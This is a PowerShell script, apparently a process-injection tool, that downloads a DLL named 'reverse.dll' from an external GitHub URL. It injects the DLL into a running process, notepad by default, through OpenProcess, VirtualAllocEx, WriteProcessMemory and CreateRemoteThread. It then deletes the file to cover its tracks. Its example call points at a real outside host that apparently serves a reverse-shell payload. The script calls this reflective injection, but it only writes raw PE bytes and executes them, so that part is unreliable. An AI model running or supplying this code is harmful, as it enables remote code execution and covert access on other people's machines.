# Add the necessary P/Invoke signatures for OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, and CloseHandle

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
"@

# Function to download the DLL from a given URL
function Download-DLL {
    param (
        [string]$Url,
        [string]$OutputPath
    )
    
    try {
        # Download the DLL from the URL
        Write-Host "[*] Downloading DLL from $Url"
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath
        Write-Host "[+] DLL downloaded to $OutputPath"
        return $true
    } catch {
        Write-Host "[!] Failed to download DLL: $_"
        return $false
    }
}

# Main function to inject DLL
function Invoke-ReflectivePEInjection {
    param (
        [string]$DllUrl,  # URL to download DLL
        [string]$ProcessName = "notepad"  # Default process name
    )
    
    # Temporary path for storing downloaded DLL
    $dllPath = "$env:temp\reverse.dll"
    
    # Step 1: Download the DLL from the web
    $downloadResult = Download-DLL -Url $DllUrl -OutputPath $dllPath
    
    if (-not $downloadResult) {
        Write-Host "[!] DLL download failed. Exiting."
        return
    }

    # Step 2: Read the DLL into memory as a byte array
    $PEBytes = [IO.File]::ReadAllBytes($dllPath)
    
    # Step 3: Find the process to inject into
    $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if ($null -eq $process) {
        Write-Host "[!] Could not find process: $ProcessName"
        return
    }
    $processId = $process.Id
    Write-Host "[*] Injecting DLL into process ID: $processId"

    # Define constants for process access rights, memory allocation, and page protection
    $PROCESS_ALL_ACCESS = 0x1F0FFF
    $MEM_COMMIT = 0x1000
    $MEM_RESERVE = 0x2000
    $PAGE_EXECUTE_READWRITE = 0x40

    # Step 4: Open the target process
    $handle = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
    
    if (-not $handle) {
        Write-Host "[!] Failed to open process."
        return
    }

    # Step 5: Allocate memory in the target process
    $addr = [Win32]::VirtualAllocEx($handle, [IntPtr]::Zero, $PEBytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

    if (-not $addr) {
        Write-Host "[!] Failed to allocate memory in process."
        [Win32]::CloseHandle($handle)
        return
    }

    # Step 6: Write the DLL into the allocated memory
    $bytesWritten = [IntPtr]::Zero
    $result = [Win32]::WriteProcessMemory($handle, $addr, $PEBytes, $PEBytes.Length, [ref]$bytesWritten)

    if (-not $result) {
        Write-Host "[!] Failed to write memory to process."
        [Win32]::CloseHandle($handle)
        return
    }

    # Step 7: Create a remote thread to execute the shellcode
    $thread = [Win32]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    if (-not $thread) {
        Write-Host "[!] Failed to create remote thread."
    } else {
        Write-Host "[+] Successfully injected DLL into $ProcessName (PID: $processId)"
    }

    # Step 8: Clean up by closing the handle
    [Win32]::CloseHandle($handle)

    # Optionally, remove the downloaded DLL file
    Remove-Item $dllPath -Force
}

# Example usage: modify with your URL
Invoke-ReflectivePEInjection -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll" -ProcessName "notepad"
